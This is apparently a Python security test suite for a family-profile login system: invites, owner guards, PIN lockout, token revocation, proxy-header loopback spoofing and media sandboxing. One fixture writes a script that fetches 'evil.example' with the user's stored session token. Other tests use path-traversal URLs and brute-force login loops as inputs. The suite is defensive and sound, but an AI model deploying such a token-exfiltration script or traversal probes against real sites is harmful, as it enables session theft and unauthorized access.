"""Pilot identity floor: invites, owner guards, lockout, revocation, media, loopback."""

from __future__ import annotations

import json
import tempfile
import time
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

import chat_attachments
import server
from fastapi import HTTPException
from fastapi.testclient import TestClient

import conversation_memory
import family_profiles
import onboarding
import profile_context
import vahana
import workflow_engine

_READINESS = {
    "model_ready": True,
    "research_ready": False,
    "connected_model_providers": [],
    "connected_search_providers": [],
    "connected_subscriptions": [],
    "local_model_ready": False,
}

_TRIP = {
    "origin": "Delhi",
    "destination": "Japan",
    "dates": "10-18 November",
    "travelers": "2 adults",
    "budget": "INR 300,000",
}


def _media_static_app():
    return next(route.app for route in server.app.routes if getattr(route, "name", "") == "media")


class ProfileSecurityTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tempdir = tempfile.TemporaryDirectory()
        self.root = Path(self.tempdir.name)
        self.media_root = self.root / "artifacts"
        attachments = self.root / "attachments"
        for directory in (self.media_root, attachments / "index", attachments / "batches"):
            directory.mkdir(parents=True)
        self.patches = [
            patch.object(server, "_AUTH_MODE", "strict"),
            patch.object(server, "_login_failures", {}),
            patch.object(family_profiles, "FAMILY_PROFILES_PATH", self.root / "family_profiles.json"),
            patch.object(family_profiles, "PROFILE_SESSION_SECRET_PATH", self.root / "profile_secret"),
            patch.object(profile_context, "PROFILES_DIR", self.root / "profiles"),
            patch.object(onboarding, "ONBOARDING_PATH", self.root / "onboarding.json"),
            patch.object(onboarding, "_connection_readiness", return_value=_READINESS),
            patch.object(conversation_memory, "THREAD_DIR", self.root / "threads"),
            patch.object(conversation_memory, "WORKING_MEMORY_DIR", self.root / "working"),
            patch.object(vahana, "INBOX_DIR", self.root / "inbox"),
            patch.object(workflow_engine, "WORKFLOW_DB", self.root / "workflows.db"),
            patch.object(workflow_engine, "_capability_flags", lambda: {"planning": True, "search": True}),
            patch.object(chat_attachments, "ATTACHMENTS_DIR", attachments),
            patch.object(chat_attachments, "_INDEX_DIR", attachments / "index"),
            patch.object(chat_attachments, "_BATCH_INDEX_DIR", attachments / "batches"),
            patch.object(_media_static_app(), "all_directories", [self.media_root]),
        ]
        for active_patch in self.patches:
            active_patch.start()
        self.client = TestClient(server.app)
        family_profiles.update_profile("default", pin="8642")
        family_profiles.create_profile("Alice", "2468")
        family_profiles.create_profile("Bob", "1357")

    def tearDown(self) -> None:
        for active_patch in reversed(self.patches):
            active_patch.stop()
        self.tempdir.cleanup()

    def _login(self, user_id: str, pin: str) -> dict:
        response = self.client.post("/profiles/login", json={"user_id": user_id, "pin": pin})
        self.assertEqual(response.status_code, 200, response.text)
        return response.json()

    def _headers(self, user_id: str, pin: str) -> dict[str, str]:
        return {"Authorization": f"Bearer {self._login(user_id, pin)['token']}"}

    # ── 1. Profile creation needs the owner or a single-use invite ──────────

    def test_anonymous_and_non_owner_cannot_create_profiles(self) -> None:
        anonymous = self.client.post("/profiles", json={"display_name": "Eve", "pin": "1111"})
        self.assertEqual(anonymous.status_code, 403)
        bogus = self.client.post(
            "/profiles", json={"display_name": "Eve", "pin": "1111", "invite_code": "AAAA-BBBB"}
        )
        self.assertEqual(bogus.status_code, 403)
        alice = self._headers("alice", "2468")
        self.assertEqual(
            self.client.post("/profiles", json={"display_name": "Eve", "pin": "1111"}, headers=alice).status_code,
            403,
        )
        self.assertEqual(self.client.post("/profiles/invites").status_code, 401)
        self.assertEqual(self.client.post("/profiles/invites", headers=alice).status_code, 403)

        owner = self._headers("default", "8642")
        created = self.client.post(
            "/profiles", json={"display_name": "Chitra", "pin": "3579"}, headers=owner
        )
        self.assertEqual(created.status_code, 201, created.text)
        self.assertEqual(created.json()["profile"]["user_id"], "chitra")
        self.assertNotIn("eve", {row["user_id"] for row in family_profiles.list_profiles()})

    def test_invite_is_single_use_and_expires(self) -> None:
        owner = self._headers("default", "8642")
        invite = self.client.post("/profiles/invites", headers=owner)
        self.assertEqual(invite.status_code, 201, invite.text)
        code = invite.json()["code"]
        self.assertNotIn(code, family_profiles.FAMILY_PROFILES_PATH.read_text(encoding="utf-8"))

        joined = self.client.post(
            "/profiles",
            json={"display_name": "Dev", "pin": "4321", "invite_code": code.lower()},
            headers={"CF-Connecting-IP": "203.0.113.7"},
        )
        self.assertEqual(joined.status_code, 201, joined.text)
        self.assertTrue(joined.json()["token"])
        reused = self.client.post(
            "/profiles", json={"display_name": "Dev Two", "pin": "4321", "invite_code": code}
        )
        self.assertEqual(reused.status_code, 403)

        stale = self.client.post("/profiles/invites", headers=owner).json()["code"]
        later = time.time() + family_profiles.INVITE_TTL_SECONDS + 60
        with patch.object(family_profiles.time, "time", return_value=later):
            expired = self.client.post(
                "/profiles", json={"display_name": "Late", "pin": "4321", "invite_code": stale}
            )
        self.assertEqual(expired.status_code, 403)

    def test_bootstrap_is_loopback_only(self) -> None:
        family_profiles.FAMILY_PROFILES_PATH.unlink()
        tunnelled = self.client.post(
            "/profiles/bootstrap",
            json={"user_id": "default", "pin": "8642"},
            headers={"CF-Connecting-IP": "198.51.100.4", "CF-Ray": "abc"},
        )
        self.assertEqual(tunnelled.status_code, 403)
        local = self.client.post("/profiles/bootstrap", json={"user_id": "default", "pin": "8642"})
        self.assertEqual(local.status_code, 200, local.text)
        again = self.client.post("/profiles/bootstrap", json={"user_id": "default", "pin": "1111"})
        self.assertEqual(again.status_code, 400)

    # ── 2. Server-side identity: omission never means the owner ─────────────

    def test_omitted_user_id_resolves_to_the_session_profile(self) -> None:
        for user_id in ("default", "bob"):
            conversation_memory.append_turn(
                user_id=user_id, session_id=f"{user_id}-thread", role="user", text=f"{user_id} secret"
            )
            workflow_engine.start_workflow_run("travel", user_id=user_id, inputs=_TRIP, title=f"{user_id} trip")
            with vahana._inbox_path(user_id).open("a", encoding="utf-8") as handle:
                handle.write(json.dumps({"id": f"{user_id}-note", "title": f"{user_id} note", "read": False}) + "\n")
        bob = self._headers("bob", "1357")

        runs = self.client.get("/workflow-runs", headers=bob)
        self.assertEqual(runs.status_code, 200, runs.text)
        self.assertEqual({run["title"] for run in runs.json()["runs"]}, {"bob trip"})
        latest = self.client.get("/threads/latest", headers=bob).json()
        self.assertEqual(latest["user_id"], "bob")
        self.assertEqual(latest["thread"]["session_id"], "bob-thread")
        inbox = self.client.get("/inbox", headers=bob).json()
        self.assertEqual([item["id"] for item in inbox["items"]], ["bob-note"])

        marked = self.client.post("/inbox/mark-read", json={}, headers=bob)
        self.assertEqual(marked.json()["marked"], 1)
        self.assertEqual(vahana.unread_count("default"), 1)
        saved = self.client.patch("/onboarding", json={"display_name": "Bobby"}, headers=bob)
        self.assertEqual(saved.status_code, 200, saved.text)
        self.assertEqual(onboarding.build_onboarding_status("bob")["display_name"], "Bobby")
        self.assertNotEqual(onboarding.build_onboarding_status("default")["display_name"], "Bobby")

        for path in ("/workflow-runs?user_id=default", "/threads/latest?user_id=default", "/inbox?user_id=default"):
            self.assertEqual(self.client.get(path, headers=bob).status_code, 403, path)
        mismatch = self.client.post("/inbox/mark-read", json={"user_id": "default"}, headers=bob)
        self.assertEqual(mismatch.status_code, 403)

    def test_uploads_without_user_id_belong_to_the_session_profile(self) -> None:
        bob = self._headers("bob", "1357")
        uploaded = self.client.post(
            "/chat/attachments",
            data={"relative_paths": "[]"},
            files=[("files", ("notes.txt", b"bob only", "text/plain"))],
            headers=bob,
        )
        self.assertEqual(uploaded.status_code, 200, uploaded.text)
        attachment_id = uploaded.json()["attachments"][0]["attachment_id"]
        path = f"/chat/attachments/{attachment_id}/content"
        self.assertEqual(self.client.get(path, headers=bob).content, b"bob only")
        self.assertEqual(self.client.get(path, headers=self._headers("alice", "2468")).status_code, 404)

    def test_body_identity_helper_never_falls_back_to_owner(self) -> None:
        request = SimpleNamespace(state=SimpleNamespace(profile_id="bob", profile_authenticated=True))
        self.assertEqual(server._assert_profile_match(request, ""), "bob")
        self.assertEqual(server._assert_profile_match(request, None), "bob")
        self.assertEqual(server._assert_profile_match(request, "bob"), "bob")
        with self.assertRaises(HTTPException) as denied:
            server._assert_profile_match(request, "default")
        self.assertEqual(denied.exception.status_code, 403)
        self.assertEqual(server.ChatRequest(query="hi").user_id, "")

    # ── 3. Owner-only host settings and device grants ───────────────────────

    def test_non_owner_cannot_manage_keys_or_device_grants(self) -> None:
        alice = self._headers("alice", "2468")
        denied = [
            self.client.post("/connections", json={"key": "sk-test", "provider": "openai"}, headers=alice),
            self.client.delete("/connections/openai", headers=alice),
            self.client.post("/connections/import-env", headers=alice),
            self.client.post("/connections/xai/oauth/start", headers=alice),
            self.client.delete("/connections/xai/oauth", headers=alice),
            self.client.post("/tiers/choice", json={"tier": "T1"}, headers=alice),
            self.client.post(
                "/connections/google/oauth/config", json={"client_id": "x", "client_secret": "y"}, headers=alice
            ),
            self.client.post(
                "/interaction-targets", json={"kind": "cua", "external_id": "host-mac"}, headers=alice
            ),
            self.client.delete("/interaction-targets/target_abc", headers=alice),
            self.client.get("/interaction-targets?profile_id=bob", headers=alice),
        ]
        self.assertEqual([response.status_code for response in denied], [403] * len(denied))
        self.assertEqual(self.client.get("/interaction-targets", headers=alice).status_code, 200)

        owner = self._headers("default", "8642")
        granted = self.client.post(
            "/interaction-targets",
            json={"kind": "cua", "external_id": "host-mac", "label": "Host Mac", "profile_id": "alice"},
            headers=owner,
        )
        self.assertEqual(granted.status_code, 200, granted.text)
        target_id = granted.json()["target"]["target_id"]
        alice_targets = self.client.get("/interaction-targets", headers=alice).json()["targets"]
        self.assertEqual([row["external_id"] for row in alice_targets], ["host-mac"])
        self.assertEqual(self.client.get("/interaction-targets", headers=owner).json()["targets"], [])
        self.assertEqual(
            self.client.delete(f"/interaction-targets/{target_id}", headers=alice).status_code, 403
        )
        revoked = self.client.delete(f"/interaction-targets/{target_id}?profile_id=alice", headers=owner)
        self.assertEqual(revoked.status_code, 200, revoked.text)
        self.assertEqual(self.client.get("/interaction-targets", headers=alice).json()["targets"], [])

    # ── 4. Login lockout ────────────────────────────────────────────────────

    def test_repeated_wrong_pins_lock_the_profile(self) -> None:
        for _ in range(server._LOGIN_PROFILE_THRESHOLD):
            wrong = self.client.post("/profiles/login", json={"user_id": "alice", "pin": "0000"})
            self.assertEqual(wrong.status_code, 401)
        locked = self.client.post("/profiles/login", json={"user_id": "alice", "pin": "2468"})
        self.assertEqual(locked.status_code, 429)
        self.assertEqual(locked.headers["retry-after"], "30")
        self.assertEqual(self.client.post("/profiles/login", json={"user_id": "bob", "pin": "1357"}).status_code, 200)

        server._login_failures["profile:alice"] = (server._LOGIN_PROFILE_THRESHOLD, 0.0)
        self.assertEqual(self.client.post("/profiles/login", json={"user_id": "alice", "pin": "0000"}).status_code, 401)
        doubled = self.client.post("/profiles/login", json={"user_id": "alice", "pin": "2468"})
        self.assertEqual(doubled.headers["retry-after"], "60")

    def test_success_resets_failures_and_ip_limiter_spans_profiles(self) -> None:
        for _ in range(server._LOGIN_PROFILE_THRESHOLD - 1):
            self.client.post("/profiles/login", json={"user_id": "bob", "pin": "0000"})
        self._login("bob", "1357")
        for _ in range(server._LOGIN_PROFILE_THRESHOLD - 1):
            self.client.post("/profiles/login", json={"user_id": "bob", "pin": "0000"})
        self._login("bob", "1357")

        attacker = {"CF-Connecting-IP": "198.51.100.23", "X-Forwarded-For": "198.51.100.23"}
        for index in range(server._LOGIN_IP_THRESHOLD):
            self.client.post("/profiles/login", json={"user_id": f"guess-{index}", "pin": "0000"}, headers=attacker)
        blocked = self.client.post("/profiles/login", json={"user_id": "alice", "pin": "2468"}, headers=attacker)
        self.assertEqual(blocked.status_code, 429)
        elsewhere = self.client.post(
            "/profiles/login", json={"user_id": "alice", "pin": "2468"}, headers={"CF-Connecting-IP": "192.0.2.8"}
        )
        self.assertEqual(elsewhere.status_code, 200)

    # ── 5. Session revocation ───────────────────────────────────────────────

    def test_pin_change_and_sign_out_everywhere_revoke_tokens(self) -> None:
        old = self._headers("alice", "2468")
        changed = self.client.patch("/profiles/alice", json={"pin": "9753", "current_pin": "2468"}, headers=old)
        self.assertEqual(changed.status_code, 200, changed.text)
        self.assertEqual(self.client.get("/profiles/session", headers=old).status_code, 401)
        fresh = {"Authorization": f"Bearer {changed.json()['session']['token']}"}
        self.assertEqual(self.client.get("/profiles/session", headers=fresh).status_code, 200)

        bob = self._headers("bob", "1357")
        self.assertEqual(self.client.post("/profiles/bob/revoke-sessions", headers=fresh).status_code, 403)
        revoked = self.client.post("/profiles/bob/revoke-sessions", headers=self._headers("default", "8642"))
        self.assertEqual(revoked.status_code, 200, revoked.text)
        self.assertEqual(self.client.get("/profiles/session", headers=bob).status_code, 401)
        self_revoked = self.client.post("/profiles/alice/revoke-sessions", headers=fresh)
        self.assertEqual(self_revoked.status_code, 200)
        self.assertEqual(self.client.get("/profiles/session", headers=fresh).status_code, 401)

    # ── 6. Loopback spoofing through the tunnel ─────────────────────────────

    def test_proxied_loopback_requests_are_not_local(self) -> None:
        loopback = TestClient(server.app, client=("127.0.0.1", 50000))
        with patch.object(server, "_AUTH_MODE", "local"):
            self.assertEqual(loopback.get("/threads/latest").status_code, 200)
            for header in ("CF-Connecting-IP", "X-Forwarded-For", "Forwarded", "X-Real-IP", "CF-Ray"):
                relayed = loopback.get("/threads/latest", headers={header: "203.0.113.50"})
                self.assertEqual(relayed.status_code, 401, header)
            tunnelled_create = loopback.post(
                "/profiles",
                json={"display_name": "Mallory", "pin": "1111"},
                headers={"CF-Connecting-IP": "203.0.113.50"},
            )
            self.assertEqual(tunnelled_create.status_code, 403)
            local_create = loopback.post("/profiles", json={"display_name": "Kiran", "pin": "1111"})
            self.assertEqual(local_create.status_code, 201, local_create.text)

    # ── 7. Media needs a profile; per-profile captures stay private ─────────

    def test_strict_media_requires_session_cookie_and_matching_profile(self) -> None:
        for relative in ("computer-use/alice/s1/shot.png", "computer-use/bob/s1/shot.png", "run-1/video.mp4"):
            target = self.media_root / relative
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(relative.encode())

        self.assertEqual(self.client.get("/media/run-1/video.mp4").status_code, 401)
        self.assertEqual(
            self.client.post("/profiles/media-session", headers={"CF-Connecting-IP": "1.2.3.4"}).status_code, 401
        )
        alice = self._headers("alice", "2468")
        opened = self.client.post("/profiles/media-session", headers={**alice, "X-Forwarded-Proto": "https"})
        self.assertEqual(opened.status_code, 200, opened.text)
        cookie = opened.headers["set-cookie"].lower()
        for flag in ("httponly", "samesite=lax", "secure", "path=/media"):
            self.assertIn(flag, cookie)

        token = alice["Authorization"].removeprefix("Bearer ")
        media = TestClient(server.app, cookies={server._MEDIA_COOKIE: token})
        self.assertEqual(media.get("/media/run-1/video.mp4").status_code, 200)
        self.assertEqual(media.get("/media/computer-use/alice/s1/shot.png").content, b"computer-use/alice/s1/shot.png")
        (self.media_root / "phone-use/bob/t1").mkdir(parents=True)
        (self.media_root / "phone-use/bob/t1/x.png").write_bytes(b"bob phone")
        for foreign in (
            "/media/computer-use/bob/s1/shot.png",
            "/media/Computer-Use/BOB/s1/shot.png",
            "/media/computer-use/alice/../bob/s1/shot.png",
            # StaticFiles drops empty segments; the owner check must too.
            "/media//computer-use/bob/s1/shot.png",
            "/media///computer-use/bob/s1/shot.png",
            "/media//phone-use/bob/t1/x.png",
            "/media/./computer-use/bob/s1/shot.png",
            "/media/computer-use//bob/s1/shot.png",
        ):
            self.assertEqual(media.get(foreign).status_code, 404, foreign)
        self.assertEqual(media.get("/media//computer-use/alice/s1/shot.png").status_code, 200)
        # The ambient cookie authenticates media reads only, never the API.
        self.assertEqual(media.get("/threads/latest").status_code, 401)
        self.assertEqual(media.post("/profiles/invites").status_code, 401)

        closed = self.client.delete("/profiles/media-session")
        self.assertEqual(closed.status_code, 200)
        self.assertIn(f'{server._MEDIA_COOKIE}=""', closed.headers["set-cookie"])

    def test_media_is_sandboxed_and_downloads_never_render(self) -> None:
        page = self.media_root / "run-1" / "page.html"
        download = self.media_root / "computer-use" / "alice" / "s1" / "downloads" / "invoice.html"
        for target in (page, download):
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text("<script>fetch('https://evil.example/?'+localStorage.narad_profile_session)</script>")
        token = self._login("alice", "2468")["token"]
        media = TestClient(server.app, cookies={server._MEDIA_COOKIE: token})

        rendered = media.get("/media/run-1/page.html")
        self.assertEqual(rendered.status_code, 200)
        # Scripts run only in an opaque origin: never with this app's storage.
        self.assertEqual(rendered.headers["content-security-policy"], "sandbox allow-scripts")
        self.assertEqual(rendered.headers["x-content-type-options"], "nosniff")
        self.assertNotIn("content-disposition", rendered.headers)
        fetched = media.get("/media/computer-use/alice/s1/downloads/invoice.html")
        self.assertEqual(fetched.status_code, 200)
        self.assertEqual(fetched.headers["content-disposition"], "attachment")
        self.assertIn("sandbox", fetched.headers["content-security-policy"])

    # ── 8. Review fixes: owner guards in every mode, PIN custody, lockout ────

    def test_profile_sessions_need_the_owner_outside_strict_mode_too(self) -> None:
        relayed = TestClient(server.app, client=("127.0.0.1", 50000))
        proxy = {"X-Forwarded-For": "100.101.102.103", "X-Forwarded-Proto": "https"}
        with patch.object(server, "_AUTH_MODE", "local"), \
             patch("kunji.delete_key", return_value=True) as delete_key:
            self.assertEqual(relayed.get("/threads/latest", headers=proxy).status_code, 401)
            bob = {**proxy, **self._headers("bob", "1357")}
            denied = [
                relayed.post("/interaction-targets", json={"kind": "cua", "external_id": "host"}, headers=bob),
                relayed.post("/connections", json={"key": "", "provider": "openai"}, headers=bob),
                relayed.delete("/connections/openai", headers=bob),
                relayed.post("/tiers/choice", json={"tier": "T1"}, headers=bob),
            ]
            self.assertEqual([response.status_code for response in denied], [403] * len(denied))
            delete_key.assert_not_called()
            self.assertEqual(self.client.get("/interaction-targets", headers=self._headers("bob", "1357")).json()["targets"], [])

            owner = {**proxy, **self._headers("default", "8642")}
            granted = relayed.post(
                "/interaction-targets",
                json={"kind": "cua", "external_id": "host", "profile_id": "bob"},
                headers=owner,
            )
            self.assertEqual(granted.status_code, 200, granted.text)
            # The host itself (loopback, no relay headers) keeps its trusted path.
            local = relayed.post("/interaction-targets", json={"kind": "cua", "external_id": "host-2"})
            self.assertEqual(local.status_code, 200, local.text)

    def test_local_model_and_key_tests_are_owner_only(self) -> None:
        runtime = type("Runtime", (), {
            "start_install": lambda self: {"ready": False, "install": {"state": "running"}},
            "ensure_server": lambda self, timeout=None: {"ready": False},
        })()
        alice = self._headers("alice", "2468")
        with patch("local_model_runtime.get_local_model_runtime", return_value=runtime), \
             patch("kunji.test_key", return_value=(True, "ok")) as test_key:
            self.assertEqual(self.client.post("/local-model/install", headers=alice).status_code, 403)
            self.assertEqual(self.client.post("/local-model/start", headers=alice).status_code, 403)
            self.assertEqual(self.client.post("/connections/openai/test", headers=alice).status_code, 403)
            test_key.assert_not_called()
            owner = self._headers("default", "8642")
            self.assertEqual(self.client.post("/local-model/install", headers=owner).status_code, 202)
            self.assertEqual(self.client.post("/local-model/start", headers=owner).status_code, 200)
            self.assertEqual(self.client.post("/connections/openai/test", headers=owner).json()["ok"], True)

    def test_owner_pin_has_one_lockout_bucket(self) -> None:
        # An empty id is no alias for the owner: it never checks the owner's PIN.
        empty = self.client.post("/profiles/login", json={"user_id": "", "pin": "8642"})
        self.assertEqual(empty.status_code, 401)
        for index in range(server._LOGIN_PROFILE_THRESHOLD):
            spelling = ("default", " DEFAULT ", "Default")[index % 3]
            self.client.post("/profiles/login", json={"user_id": spelling, "pin": "0000"})
            server._login_failures.pop("ip:testclient", None)  # as if from fresh IPs
        locked = self.client.post("/profiles/login", json={"user_id": "default", "pin": "8642"})
        self.assertEqual(locked.status_code, 429)
        profile_keys = {key for key in server._login_failures if key.startswith("profile:")}
        self.assertEqual(profile_keys, {"profile:default"})

    def test_login_table_is_bounded_and_ipv6_is_keyed_per_64(self) -> None:
        with patch.object(server, "_LOGIN_TABLE_LIMIT", 8):
            server._login_failures["profile:alice"] = (2, 0.0)
            for index in range(40):
                self.client.post(
                    "/profiles/login",
                    json={"user_id": f"random-{index}", "pin": "0000"},
                    headers={"CF-Connecting-IP": f"2001:db8:{index:x}::1"},
                )
            self.assertLessEqual(len(server._login_failures), 8)
            self.assertFalse([key for key in server._login_failures if key.startswith("profile:random")])
            self.assertEqual(server._login_failures["profile:alice"], (2, 0.0))  # never evicted

        server._login_failures.clear()
        for suffix in range(server._LOGIN_IP_THRESHOLD):
            self.client.post(
                "/profiles/login",
                json={"user_id": "nobody", "pin": "0000"},
                headers={"CF-Connecting-IP": f"2001:db8:1:2::{suffix + 1:x}"},
            )
        same_subnet = self.client.post(
            "/profiles/login", json={"user_id": "alice", "pin": "2468"}, headers={"CF-Connecting-IP": "2001:db8:1:2::ffff"}
        )
        self.assertEqual(same_subnet.status_code, 429)
        self.assertEqual(server._throttle_address("::ffff:198.51.100.7"), "198.51.100.7")

    def test_public_profile_paths_match_the_method_and_reserved_ids(self) -> None:
        member = family_profiles.create_profile("Login", "1234")
        self.assertNotEqual(member["user_id"], "login")
        # A legacy registry may already hold the id; the gate must still hold.
        registry = json.loads(family_profiles.FAMILY_PROFILES_PATH.read_text(encoding="utf-8"))
        registry["profiles"]["login"] = {**registry["profiles"][member["user_id"]], "user_id": "login"}
        family_profiles.FAMILY_PROFILES_PATH.write_text(json.dumps(registry), encoding="utf-8")
        for path in ("/profiles/login", "/profiles/bootstrap"):
            hijack = self.client.patch(path, json={"pin": "0000", "display_name": "pwned"})
            self.assertEqual(hijack.status_code, 401, path)
        self.assertFalse(family_profiles.verify_pin("login", "0000"))
        anonymous = SimpleNamespace(state=SimpleNamespace(profile_authenticated=False, host_authority=False))
        with self.assertRaises(HTTPException) as denied:
            server._assert_profile_match(anonymous, "alice")
        self.assertEqual(denied.exception.status_code, 401)

    def test_pin_change_needs_the_current_pin_and_owner_can_reset(self) -> None:
        stolen = self._headers("alice", "2468")
        for body in ({"pin": "0000"}, {"pin": "0000", "current_pin": "1111"}):
            refused = self.client.patch("/profiles/alice", json=body, headers=stolen)
            self.assertEqual(refused.status_code, 403, body)
        self.assertTrue(family_profiles.verify_pin("alice", "2468"))
        self.assertEqual(self.client.get("/profiles/session", headers=stolen).status_code, 200)
        renamed = self.client.patch("/profiles/alice", json={"display_name": "Alice R"}, headers=stolen)
        self.assertEqual(renamed.status_code, 200, renamed.text)

        bob = self._headers("bob", "1357")
        self.assertEqual(self.client.post("/profiles/alice/reset-pin", json={"pin": "5555"}, headers=bob).status_code, 403)
        owner = self._headers("default", "8642")
        self.assertEqual(self.client.post("/profiles/default/reset-pin", json={"pin": "5555"}, headers=owner).status_code, 400)
        self.assertEqual(self.client.post("/profiles/nobody/reset-pin", json={"pin": "5555"}, headers=owner).status_code, 404)
        reset = self.client.post("/profiles/alice/reset-pin", json={"pin": "5555"}, headers=owner)
        self.assertEqual(reset.status_code, 200, reset.text)
        self.assertNotIn("session", reset.json())
        self.assertEqual(self.client.get("/profiles/session", headers=stolen).status_code, 401)
        self._login("alice", "5555")

    def test_bootstrap_refusal_names_the_host_address(self) -> None:
        family_profiles.FAMILY_PROFILES_PATH.unlink()
        tunnelled = self.client.post(
            "/profiles/bootstrap", json={"user_id": "default", "pin": "8642"}, headers={"CF-Connecting-IP": "198.51.100.4"}
        )
        self.assertEqual(tunnelled.status_code, 403)
        self.assertIn("http://127.0.0.1:", tunnelled.json()["detail"])


if __name__ == "__main__":
    unittest.main()
